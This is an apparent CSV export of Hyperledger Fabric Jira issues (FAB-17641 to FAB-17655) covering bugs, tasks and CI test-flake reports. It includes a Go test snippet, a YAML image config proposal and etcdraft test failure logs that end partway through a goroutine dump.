Intermittent test failure in e2e IT on development workstaion: checking successful removals of all old chaincode containers,FAB-17641,44615,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,sykesm,sykesm,sykesm,19/Mar/20 11:28 PM,25/Mar/20 5:22 PM,28/Oct/23 3:09 AM,25/Mar/20 5:22 PM,,,,,,,,,,,,,,fabric-peer,,,,,,,,,0,ipm,,,,,"When running any sort of docker workflow on a system, the integration test can fail.

This is due to an assumption in the test that fabric is the only entity managing containers on the host. This is not a good assumption as many developers use docker based tools on their workstation.

{code}
			By(""removing chaincode containers from all peers"")
			ctx := context.Background()
			containers, err := client.ListContainers(docker.ListContainersOptions{})
			Expect(err).NotTo(HaveOccurred())
...
			By(""checking successful removals of all old chaincode containers"")
			newContainers, err := client.ListContainers(docker.ListContainersOptions{})
			Expect(err).NotTo(HaveOccurred())
			Expect(len(newContainers)).To(BeEquivalentTo(len(containers)))

{code}

The tests should be updated to further filter the list of containers to those that include the configured network ID associated with the fabric configuration.",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjy",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Mar/20 11:38 PM;sykesm;[~denyeart] This is not a CI flake as it's never going to be hit in CI.;;;","25/Mar/20 5:20 AM;sykesm;https://github.com/hyperledger/fabric/pull/909;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to update MSP config,FAB-17642,44617,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,tsharris,tsharris,20/Mar/20 3:28 AM,25/Mar/20 11:56 PM,28/Oct/23 3:09 AM,25/Mar/20 11:56 PM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,ipm,,,,,,,tsharris,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjri",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tsharris,wlahti,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Mar/20 7:53 AM;wlahti;https://github.com/hyperledger/fabric/pull/912;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Rationalize Capabilities map value,FAB-17643,44619,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Invalid,,caod,caod,20/Mar/20 5:45 AM,30/Mar/20 10:58 PM,28/Oct/23 3:09 AM,30/Mar/20 10:58 PM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,ipm,,,,,"Currently we map capabilities from a string to a bool. We should investigate if we need this to be treated as a bool since if we're removing a capability or disabling one, we can just remove it from the map rather than setting it to false.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzo",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Test That Uses SoftHSM to Test PKCS11,FAB-17644,44625,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,21/Mar/20 1:52 AM,11/Jan/21 1:37 AM,28/Oct/23 3:09 AM,11/Jan/21 1:37 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Create a test with a very simple topology:
 * 1 org
 * 1 orderer
 * 1 peer with ca
 * SimleCC go

Configure SoftHSM and run a large number of transactions with multiple threads to stress the peer",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|hzwqrk:5iwr4rb8w",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
AddOrgToConsortium shouldn't allow adding an org name that already exists,FAB-17645,44626,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,21/Mar/20 7:42 AM,24/Mar/20 12:42 AM,28/Oct/23 3:09 AM,24/Mar/20 12:42 AM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,ipm,,,,,"This results in overwriting the existing org definition, which is (probably) not desired. We should return an error when this happens. 

Side note: update TestAddOrgToConsortium to add a non-existing org (aka not Org1 or Org2) in the test.",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjr9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Mar/20 10:57 PM;wlahti;The commit to fix this is part of: [https://github.com/hyperledger/fabric/pull/901];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Design Doc for Interop-Lite,FAB-17647,44638,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,24/Mar/20 2:04 AM,23/Apr/20 2:11 AM,28/Oct/23 3:09 AM,23/Apr/20 2:11 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,Create a plan for introducing a minimal set of requirements for a minimal set of tests we can use to test interoperability,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Apr/20 11:14 PM;btl5037;InterOpLite.pdf;https://jira.hyperledger.org/secure/attachment/18208/InterOpLite.pdf",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwi",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Create Design Doc for CI Improvements,FAB-17648,44639,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,btl5037,btl5037,btl5037,24/Mar/20 2:05 AM,11/Jan/21 1:37 AM,28/Oct/23 3:09 AM,11/Jan/21 1:37 AM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,,,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i0192i:y",,,,Unset,Unset,To Do,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Allow the Use of Any Docker Image,FAB-17649,44640,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,btl5037,btl5037,btl5037,24/Mar/20 2:44 AM,03/Apr/20 10:34 PM,28/Oct/23 3:09 AM,03/Apr/20 10:34 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"We should allow the use of any docker image. So we should introduce a new config struct in the spec files to replace `fabricVersion` as follows:
{code:java}
images:
    ca: hyperledger/fabric-ca:2.1.0
    orderer: hyperledger/fabric-orderer:2.1.0
    peer: hyperledger/fabric-peer:2.1.0{code}
And so on for each image. This is necessary now that project versions are starting to diverge, we need to be able to specify the exact image we need.

This would also allow someone to plug in their own images pulled from their own dockerhub when using both Docker and Kube. ",,btl5037,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zwzi",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix incorrect word,FAB-17650,44642,,Documentation,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,Eggsy,Eggsy,Eggsy,24/Mar/20 7:52 PM,26/Mar/20 10:01 PM,28/Oct/23 3:09 AM,26/Mar/20 10:01 PM,,,,,,,,,,v2.1.0,,,,,,,,,,,,,0,,,,,,Fix incorrect word,,Eggsy,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a77:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),Eggsy,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in consensus/etcdraft: Chain 3-node Raft cluster when 3/3 nodes are running [It] orders envelope on leader ,FAB-17651,44644,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,sykesm,sykesm,24/Mar/20 10:50 PM,24/Mar/20 10:54 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"{code}
2020-03-20T16:53:47.0047730Z Summarizing 1 Failure:
2020-03-20T16:53:47.0047896Z 
2020-03-20T16:53:47.0048465Z [Fail] Chain 3-node Raft cluster when 3/3 nodes are running [It] orders envelope on leader 
2020-03-20T16:53:47.0049185Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2416
2020-03-20T16:53:47.0049457Z 
2020-03-20T16:53:47.0049797Z Ran 104 of 104 Specs in 28.851 seconds
2020-03-20T16:53:47.0050392Z FAIL! -- 103 Passed | 1 Failed | 0 Pending | 0 Skipped
2020-03-20T16:53:47.0050880Z --- FAIL: TestEtcdraft (28.85s)
2020-03-20T16:53:47.0051380Z 2020-03-20 16:53:46.301 UTC [test] Stop -> INFO 037 Periodic check is stopping.
2020-03-20T16:53:47.0051668Z FAIL
2020-03-20T16:53:47.0051832Z coverage: 86.7% of statements
2020-03-20T16:53:47.0052101Z FAIL	github.com/hyperledger/fabric/orderer/consensus/etcdraft	35.912s
{code}",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Mar/20 10:47 PM;sykesm;3-20.txt;https://jira.hyperledger.org/secure/attachment/18179/3-20.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a7n:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in consensus/etcdraft: Chain 3-node Raft cluster when reconfiguring raft cluster reconfiguration [It] ensures that despite leader failure cluster,FAB-17652,44645,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,sykesm,sykesm,24/Mar/20 10:55 PM,24/Mar/20 10:55 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"{code:java}
2020-03-24T13:18:45.2971828Z Summarizing 1 Failure:
2020-03-24T13:18:45.2972071Z 
2020-03-24T13:18:45.2972934Z [Fail] Chain 3-node Raft cluster when reconfiguring raft cluster reconfiguration [It] ensures that despite leader failure cluster continue to process configuration to remove the leader 
2020-03-24T13:18:45.2973881Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:2218
2020-03-24T13:18:45.2974174Z 
2020-03-24T13:18:45.2974543Z Ran 104 of 104 Specs in 30.212 seconds
2020-03-24T13:18:45.2975184Z FAIL! -- 103 Passed | 1 Failed | 0 Pending | 0 Skipped
2020-03-24T13:18:45.2975773Z --- FAIL: TestEtcdraft (30.21s)
2020-03-24T13:18:45.2976314Z 2020-03-24 13:18:44.562 UTC [test] Stop -> INFO 037 Periodic check is stopping.
2020-03-24T13:18:45.2976621Z FAIL
2020-03-24T13:18:45.2976799Z coverage: 86.5% of statements
2020-03-24T13:18:45.2977090Z FAIL	github.com/hyperledger/fabric/orderer/consensus/etcdraft	37.342s {code}",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Mar/20 10:55 PM;sykesm;3-24.txt;https://jira.hyperledger.org/secure/attachment/18180/3-24.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a7v:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in consensus/etcdraft: Chain 3-node Raft cluster when reconfiguring raft cluster reconfiguration [It] adding node to the cluster ,FAB-17653,44646,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,sykesm,sykesm,24/Mar/20 11:52 PM,25/Sep/20 12:51 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"{code}
2020-03-24T14:41:49.6070861Z ------------------------------
2020-03-24T14:41:49.6071240Z • Failure [10.127 seconds]
2020-03-24T14:41:49.6071428Z Chain
2020-03-24T14:41:49.6071913Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:78
2020-03-24T14:41:49.6072376Z   3-node Raft cluster
2020-03-24T14:41:49.6072899Z   /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1453
2020-03-24T14:41:49.6073408Z     when reconfiguring raft cluster
2020-03-24T14:41:49.6073972Z     /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1603
2020-03-24T14:41:49.6074305Z       reconfiguration
2020-03-24T14:41:49.6074852Z       /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1712
2020-03-24T14:41:49.6075387Z         adding node to the cluster [It]
2020-03-24T14:41:49.6075975Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1927
2020-03-24T14:41:49.6076491Z 
2020-03-24T14:41:49.6076815Z         Timed out after 10.000s.
2020-03-24T14:41:49.6077013Z         Expected
2020-03-24T14:41:49.6077188Z             <int>: 1
2020-03-24T14:41:49.6077378Z         to equal
2020-03-24T14:41:49.6077684Z             <int>: 2
2020-03-24T14:41:49.6077827Z 
2020-03-24T14:41:49.6078132Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1940
{code}",,sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Sep/20 12:51 AM;wenjian;09242020.log;https://jira.hyperledger.org/secure/attachment/18812/09242020.log","24/Mar/20 11:52 PM;sykesm;3-24.txt;https://jira.hyperledger.org/secure/attachment/18183/3-24.txt",,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a83:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Sep/20 12:47 AM;wenjian;Hit the same today (9/24/2020): [https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/22217/logs/52]

log file attached

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
change barebones test to execute read/write,FAB-17654,44647,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dongming,dongming,dongming,25/Mar/20 2:14 AM,30/Mar/20 9:37 PM,28/Oct/23 3:09 AM,30/Mar/20 9:37 PM,,,,,,,,,,,,,,fabric-quality,,,,,,,,,0,,,,,,"Barebones test uses samplecc which does encrytion/decryption twice and then write only.
The encryption/decryption part is not needed in a Fabric test (only adds noise and complexity).
In order to avoid the unnecessary parts, add test coverage for mvcc with readsets, we will use map_private chaincode in the test with `getPut` command.
This will also enable testing of private data workloads by using getPutPrivate instead of getPut.",,dongming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a8b:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dongming,,,,,,,,,,,,,,dependabot/go_modules/regression/publish/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/golang.org/x/net-0.7.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/net-0.7.0,dependabot/go_modules/regression/barebones/golang.org/x/net-0.7.0,dependabot/go_modules/tools/gotools/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/smoke/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/smoke/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/publish/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/smoke/golang.org/x/text-0.3.8,release-2.5,lindluni-patch-1,dependabot/go_modules/regression/publish/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/barebones/github.com/opencontainers/runc-1.1.5,release-2.4,dependabot/go_modules/regression/basicnetwork/k8s.io/client-go-0.20.0,dependabot/go_modules/tools/chaincode-integration/resources/chaincode/simple-go/golang.org/x/text-0.3.8,dependabot/go_modules/regression/publish/golang.org/x/net-0.7.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/publish/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/golang.org/x/net-0.7.0,dependabot/go_modules/regression/smoke/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/basicnetwork/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/golang.org/x/text-0.3.8,revert-342-mergify/bp/main/pr-340,dependabot/go_modules/regression/basicnetwork/golang.org/x/sys-0.1.0,dependabot/go_modules/regression/publish/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/regression/smoke/k8s.io/client-go-0.20.0,dependabot/go_modules/regression/basicnetwork/github.com/docker/docker-20.10.24incompatible,dependabot/go_modules/tools/operator/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/golang.org/x/text-0.3.8,dependabot/go_modules/regression/basicnetwork/golang.org/x/text-0.3.8,dependabot/go_modules/regression/smoke/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/crypto-0.1.0,dependabot/go_modules/regression/barebones/golang.org/x/sys-0.1.0,dependabot/go_modules/tools/operator/github.com/opencontainers/runc-1.1.5,dependabot/go_modules/regression/barebones/k8s.io/client-go-0.20.0,dependabot/go_modules/chaincodes/marbles02_private/go/golang.org/x/net-0.7.0,dependabot/go_modules/tools/operator/github.com/docker/docker-20.10.24incompatible,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Mar/20 3:04 AM;dongming;[https://github.com/hyperledger/fabric-test/pull/146];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in consensus/etcdraft: panic: test timed out after 20m0s,FAB-17655,44648,,Bug,Unverified,FAB,Fabric,software,denyeart,,,Medium,,,sykesm,sykesm,25/Mar/20 5:27 AM,25/Mar/20 5:39 AM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"{code}
2020-03-24T20:15:01.5647189Z panic: test timed out after 20m0s
2020-03-24T20:15:01.5647371Z 
2020-03-24T20:15:01.5647642Z goroutine 5330 [running]:
2020-03-24T20:15:01.5647883Z testing.(*M).startAlarm.func1()
2020-03-24T20:15:01.5648242Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:1377 +0x11c
2020-03-24T20:15:01.5648562Z created by time.goFunc
2020-03-24T20:15:01.5648863Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/time/sleep.go:168 +0x52
2020-03-24T20:15:01.5649129Z 
2020-03-24T20:15:01.5649333Z goroutine 1 [chan receive, 19 minutes]:
2020-03-24T20:15:01.5649659Z testing.(*T).Run(0xc0000d0000, 0x142e7dd, 0xc, 0x1473160, 0x1)
2020-03-24T20:15:01.5650085Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:961 +0x68a
2020-03-24T20:15:01.5650426Z testing.runTests.func1(0xc0000d0000)
2020-03-24T20:15:01.5650768Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:1202 +0xa7
2020-03-24T20:15:01.5651146Z testing.tRunner(0xc0000d0000, 0xc00038dcd8)
2020-03-24T20:15:01.5651503Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:909 +0x19a
2020-03-24T20:15:01.5651890Z testing.runTests(0xc00000f180, 0x1f8cba0, 0x11, 0x11, 0x0)
2020-03-24T20:15:01.5652304Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:1200 +0x522
2020-03-24T20:15:01.5652646Z testing.(*M).Run(0xc000012300, 0x0)
2020-03-24T20:15:01.5652988Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:1117 +0x300
2020-03-24T20:15:01.5653304Z main.main()
2020-03-24T20:15:01.5653511Z 	_testmain.go:150 +0x338
2020-03-24T20:15:01.5653676Z 
2020-03-24T20:15:01.5653873Z goroutine 26 [syscall, 20 minutes]:
2020-03-24T20:15:01.5654153Z os/signal.signal_recv(0x47b301)
2020-03-24T20:15:01.5654488Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/runtime/sigqueue.go:147 +0x9c
2020-03-24T20:15:01.5654789Z os/signal.loop()
2020-03-24T20:15:01.5655121Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/os/signal/signal_unix.go:23 +0x30
2020-03-24T20:15:01.5655606Z created by os/signal.init.0
2020-03-24T20:15:01.5655951Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/os/signal/signal_unix.go:29 +0x4f
2020-03-24T20:15:01.5656210Z 
2020-03-24T20:15:01.5656445Z goroutine 28 [chan receive, 20 minutes]:
